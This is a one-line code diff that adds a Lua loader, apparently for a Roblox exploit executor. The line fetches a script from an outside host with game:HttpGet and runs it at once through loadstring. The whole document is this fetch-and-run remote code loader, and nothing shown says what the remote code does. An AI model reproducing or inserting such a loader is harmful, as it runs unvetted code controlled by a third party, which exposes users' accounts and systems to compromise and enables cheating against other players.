@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://rizz.ct8.pl/scripts/Main", true))();
